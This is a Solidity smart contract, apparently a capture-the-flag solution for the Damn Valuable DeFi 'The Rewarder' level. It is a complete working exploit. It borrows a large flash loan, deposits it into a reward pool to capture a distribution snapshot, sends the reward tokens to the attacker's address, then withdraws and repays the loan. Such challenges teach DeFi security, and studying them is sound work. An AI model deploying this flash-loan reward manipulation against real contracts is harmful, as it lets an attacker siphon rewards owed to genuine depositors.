// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";
import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";


contract RewarderAttacker {
    DamnValuableToken public immutable liquidityToken;
    FlashLoanerPool public immutable flashLoanerPool;
    TheRewarderPool public immutable theRewarderPool;
    RewardToken public immutable rewardToken;
    address public immutable attacker;

    constructor(
        address liquidityTokenAddress,
        address flashLoanerPoolAddress,
        address theRewarderPoolAddress,
        address rewardTokenAddress
    ) {
        liquidityToken = DamnValuableToken(liquidityTokenAddress);
        flashLoanerPool = FlashLoanerPool(flashLoanerPoolAddress);
        theRewarderPool = TheRewarderPool(theRewarderPoolAddress);
        rewardToken = RewardToken(rewardTokenAddress);
        attacker = msg.sender;
    }

    function attack() external {
        uint256 amount = 1000000 ether;
        flashLoanerPool.flashLoan(amount);
    }

    function receiveFlashLoan(uint256 amount) external {
        liquidityToken.approve(address(theRewarderPool), amount);
        theRewarderPool.deposit(amount);
        theRewarderPool.distributeRewards();
        rewardToken.transfer(attacker, rewardToken.balanceOf(address(this)));
        theRewarderPool.withdraw(amount);
        liquidityToken.transfer(address(flashLoanerPool), amount);
    }
}